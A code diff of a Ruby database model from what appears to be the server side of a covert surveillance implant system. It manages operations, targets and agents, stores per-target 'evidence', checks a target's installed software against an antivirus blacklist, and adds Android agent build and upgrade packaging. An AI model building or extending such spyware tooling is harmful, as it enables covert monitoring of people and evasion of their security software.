@@ -50,12 +50,18 @@ class Item
 
   # checksum
   field :cs, type: String
-  
+
+  CHECKSUM_ARGUMENTS = [:_id, :name, :counter, :status, :_kind, :path]
+  AGENT_CHECKSUM_ARGUMENTS = [:instance, :type, :platform, :deleted, :uninstalled, :demo, :upgradable, :scout, :good]
+
+  # scopes
+  scope :only_checksum_arguments, only(CHECKSUM_ARGUMENTS + AGENT_CHECKSUM_ARGUMENTS + [:cs])
   scope :operations, where(_kind: 'operation')
   scope :targets, where(_kind: 'target')
   scope :agents, where(_kind: 'agent')
   scope :factories, where(_kind: 'factory')
   scope :path_include, lambda { |item| where('path' => {'$in' =>[item.kind_of?(Item) ? item._id : Moped::BSON::ObjectId.from_string(item.to_s)]}) }
+
 
   # for the access control
   has_and_belongs_to_many :users, :dependent => :nullify, :autosave => true, inverse_of: nil, index: true
@@ -74,6 +80,8 @@ class Item
   index({name: 1}, {background: true})
   index({status: 1}, {background: true})
   index({_kind: 1}, {background: true})
+  index({user_ids: 1}, {background: true})
+  index({deleted: 1}, {background: true})
   index({ident: 1}, {background: true})
   index({instance: 1}, {background: true})
   index({path: 1}, {background: true})
@@ -91,6 +99,28 @@ class Item
   before_save :do_checksum
 
   public
+
+  def self.send_dashboard_push(*items)
+    WatchedItem.matching(*items) do |item, user_ids|
+      stats = item.stat.attributes.reject { |key| !%w[evidence dashboard].include?(key) }
+
+      stats[:last_sync] = item.stat.last_sync
+
+      if item._kind == 'agent'
+        stats[:last_sync_status] = item.stat.last_sync_status
+      end
+
+      message = {item: item, rcpts: user_ids, stats: stats, suppress: {start: Time.now.getutc.to_f, key: item.id}}
+      RCS::DB::PushManager.instance.notify('dashboard', message)
+    end
+  end
+
+  def self.operation_items_sorted_by_kind(operation)
+    operation_id = operation.respond_to?(:id) ? operation.id : Moped::BSON::ObjectId.from_string(operation)
+    order = %w[operation target global factory agent]
+    items = self.or([{_id: operation_id}, {path: {'$in' => [operation_id]}}]).all
+    items.sort! { |x, y| order.index(x[:_kind]) <=> order.index(y[:_kind]) }
+  end
 
   def self.reset_dashboard
     Item.any_in(_kind: ['agent', 'target']).each {|i| i.reset_dashboard}
@@ -147,37 +177,43 @@ class Item
         # self.stat.evidence = {}
         # ::Evidence::TYPES.each do |type|
         #   query = {type: type, aid: self._id}
-        #   self.stat.evidence[type] = Evidence.collection_class(self.get_parent[:_id]).where(query).count
+        #   self.stat.evidence[type] = Evidence.target(self.get_parent[:_id]).where(query).count
         # end
-        stat.evidence = Evidence.collection_class(get_parent).count_by_type(aid: id.to_s)
+        stat.evidence = Evidence.target(get_parent).count_by_type(aid: id.to_s)
         save
     end
     trace :debug, "Restat for #{self._kind} #{self.name} performed in #{Time.now - t} secs" if RCS::DB::Config.instance.global['PERF']
   end
 
-  def move_target(operation)
-    self.path = [operation._id]
-    self.users = operation.users
-    self.save
+  def move_target(other_operation)
+    update_attributes(path: [other_operation.id], users: other_operation.users)
 
-    # update the path in alerts and connectors
-    ::Alert.all.each {|a| a.update_path(self._id, self.path + [self._id])}
-    ::Connector.all.each {|a| a.update_path(self._id, self.path + [self._id])}
+    new_target_path = self.path + [self.id]
 
     # move every agent and factory belonging to this target
-    Item.any_in({_kind: ['agent', 'factory']}).in({path: [ self._id ]}).each do |agent|
-      agent.path = self.path + [self._id]
-      agent.save
+    Item
+      .any_in(_kind: ['agent', 'factory'])
+      .where(path: self.id)
+      .each { |item| item.update_attributes!(path: new_target_path) }
 
-      # update the path in alerts and connectors
-      ::Alert.all.each {|a| a.update_path(agent._id, agent.path + [agent._id])}
-      ::Connector.all.each {|a| a.update_path(agent._id, agent.path + [agent._id])}
-    end
+    # update the path in alerts and connectors (change the operation id)
+    ::Alert.where(path: self.id).each { |c| c.update_path(0 => other_operation.id) }
+    ::Connector.where(path: self.id).each { |c| c.update_path(0 => other_operation.id) }
 
     # also move the linked entity
-    Entity.any_in({type: :target}).in({path: [ self._id ]}).each do |entity|
-      entity.path = self.path + [self._id]
+    moved_entities = []
+
+    Entity.targets.where(path: self.id).each do |entity|
+      entity.update_attributes(path: new_target_path)
+      RCS::DB::LinkManager.instance.del_all_links(entity)
       entity.save
+      moved_entities << entity
+    end
+
+    moved_entities.each do |entity|
+      entity.handles.each { |handle| handle.link! }
+
+      Aggregate.target(entity.target_id).positions.each(&:add_to_intelligence_queue)
     end
   end
 
@@ -376,7 +412,14 @@ class Item
         if self.version >= 2012063001
           add_upgrade('core-1_5.0', File.join(build.tmpdir, 'net_rim_bb_lib-1_5.0.cod'))
           add_upgrade('core-0_5.0', File.join(build.tmpdir, 'net_rim_bb_lib_5.0.cod'))
-		    end
+        end
+      when 'android'
+        build.melt({'appname' => 'core'})
+        build.sign({})
+        add_upgrade('core.v2.apk', File.join(build.tmpdir, 'core.v2.apk'))
+        add_upgrade('core.default.apk', File.join(build.tmpdir, 'core.default.apk'))
+        add_upgrade('upgrade.v2.sh', File.join(build.tmpdir, 'upgrade.sh'))
+        add_upgrade('upgrade.default.sh', File.join(build.tmpdir, 'upgrade.sh'))
     end
 
     # always upgrade the core
@@ -488,7 +531,7 @@ class Item
         # dropping flag is set only by cascading from target
         unless self[:dropping]
           trace :info, "Deleting evidence for agent #{self.name}..."
-          Evidence.collection_class(self.path.last).destroy_all(aid: self._id.to_s)
+          Evidence.target(self.path.last).destroy_all(aid: self._id.to_s)
           trace :info, "Deleting aggregates for agent #{self.name}..."
           Aggregate.target(self.path.last).destroy_all(aid: self._id.to_s)
           trace :info, "Rebuilding summary for target #{self.get_parent.name}..."
@@ -513,7 +556,7 @@ class Item
     return if self._kind != 'target'
 
     # drop the evidence collection of this target
-    Evidence.collection_class(self._id.to_s).collection.drop
+    Evidence.target(self._id.to_s).collection.drop
     Aggregate.target(self._id.to_s).collection.drop
     RCS::DB::GridFS.drop_collection(self._id.to_s)
   end
@@ -521,7 +564,7 @@ class Item
   def create_target_collections
     return if self._kind != 'target'
 
-    Evidence.collection_class(self._id).create_collection
+    Evidence.target(self._id).create_collection
     Aggregate.target(self._id).create_collection
     RCS::DB::GridFS.create_collection(self._id)
   end
@@ -529,7 +572,7 @@ class Item
   def blacklisted_software?
     raise BlacklistError.new("Cannot determine blacklist") if self._kind != 'agent'
 
-    device = Evidence.collection_class(self.path.last).where({type: 'device', aid: self._id.to_s}).last
+    device = Evidence.target(self.path.last).where({type: 'device', aid: self._id.to_s}).last
     raise BlacklistError.new("Cannot determine installed software") unless device
 
     installed = device[:data]['content']
@@ -537,6 +580,8 @@ class Item
     # check for installed AV
     File.open(RCS::DB::Config.instance.file('blacklist'), "r:UTF-8") do |f|
       while offending = f.gets
+        offending = offending.split('#').first
+        offending.strip!
         offending.chomp!
         next unless offending
         bver, bbit, bmatch = offending.split('|')
@@ -602,15 +647,14 @@ class Item
 
   def calculate_checksum
     # take the fields that are relevant and calculate the checksum on it
-    hash = [self._id, self.name, self.counter, self.status, self._kind, self.path]
+    args = CHECKSUM_ARGUMENTS.map { |name| attributes[name.to_s] }
 
     if self._kind == 'agent'
-      hash << [self.instance, self.type, self.platform, self.deleted, self.uninstalled, self.demo, self.upgradable, self.scout, self.good]
+      args << AGENT_CHECKSUM_ARGUMENTS.map { |name| attributes[name.to_s] }
     end
 
-    aes_encrypt(Digest::SHA1.digest(hash.inspect), Digest::SHA1.digest("∫∑x=1 ∆t")).unpack('H*').first
+    aes_encrypt(Digest::SHA1.digest(args.inspect), Digest::SHA1.digest("∫∑x=1 ∆t")).unpack('H*').first
   end
-
 end
 
 class FilesystemRequest
